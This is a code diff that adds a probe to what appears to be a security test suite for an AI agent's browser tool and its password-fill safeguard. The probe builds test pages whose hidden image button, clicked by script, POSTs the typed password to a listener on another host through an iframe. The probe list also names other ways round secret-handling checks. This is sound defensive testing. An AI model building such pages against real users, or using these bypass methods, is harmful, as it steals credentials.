@@ -1123,6 +1123,46 @@ def s2(ctx):
     return False, "the username was typed and kept as the page added its button"
 
 
+
+def f10(ctx):
+    """An image button whose formaction sends its form to another site, into
+    a frame (formtarget). form.elements never lists an image button, so the
+    fill rule did not see it, and a frame's document request was judged by
+    its address alone. a: the button is on the page when the fill is asked,
+    and the page clicks it once something is typed: the fill must be
+    refused. b: the page adds the button only after the password is typed
+    (no fill rule sees ahead) and clicks it: the frame's POST must be
+    stopped. Either way the host listener must never get the password."""
+    if not ctx.split:
+        return None, "the signed-in browser's rule; needs --split"
+    ctx.page()
+    target = f"http://{ctx.host}:{ctx.port}/f10"
+    def button(part):
+        return (f'<input type=image id=go alt=Go formaction="{target}{part}" formtarget=f10 '
+                'style="width:80px;height:30px">')
+    site_page(ctx, "f10a.html", '<form action="/done" method=post><input id=p name=p type=password>' + button("a")
+              + "</form><iframe name=f10></iframe><script>p.addEventListener('input',"
+              "()=>setTimeout(()=>go.click(),1500),{once:true})</script>")
+    site_page(ctx, "f10b.html", '<form id=f action="/done" method=post><input id=p name=p type=password></form>'
+              "<iframe name=f10></iframe><script>p.addEventListener('input',()=>setTimeout(()=>{"
+              f"f.insertAdjacentHTML('beforeend',{json.dumps(button('b'))});go.click()}},1500),{{once:true}})</script>")
+    said = {}
+    for part in ("a", "b"):
+        ctx.c.tool("browser", action="navigate", url=f"http://localhost:8000/f10{part}.html")
+        refs = refs_of(ctx.c.tool("browser", action="text")[0])
+        if "password" not in refs:
+            return "broken", f"f10{part} has no password field"
+        text, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
+        said[part] = ("refused" if refused else "typed")
+        time.sleep(3)
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
+    got = [part for part in ("a", "b") if ctx.heard("/f10" + part, only=[K.LOCAL_PASSWORD])]
+    if said["b"] != "typed":
+        return "broken", "f10b's plain sign-in form was refused"
+    return bool(got), ("the listener got the password from " + ", ".join(f"f10{p} ({said[p]})" for p in got) if got else
+                       f"f10a: fill {said['a']}; f10b: typed, then the frame's POST elsewhere was stopped; the listener got nothing")
+
+
 PROBES = [
     ("A1", "variable read back in another spelling by a shell job", a1),
     ("A2", "files get of a file holding the value in base64", a2),
@@ -1178,6 +1218,7 @@ PROBES = [
     ("F5", "a login's password is typed on a subdomain of its origin", f5),
     ("F6", "a download begun on a page mid sign-in reaches the agent", f6),
     ("F8", "a revoked share's session stays usable while another grant names its site", f8),
+    ("F10", "a password POSTed to another site into a frame by an image button's formaction", f10),
     ("F9", "a password typed into its own site's GET form, sent by the browser, loads in an address", f9),
     ("S1", "a two-step sign-in whose script builds the password field with no form: refused, or read back", s1),
     ("S2", "a username refused because the page adds its button while it is typed", s2),
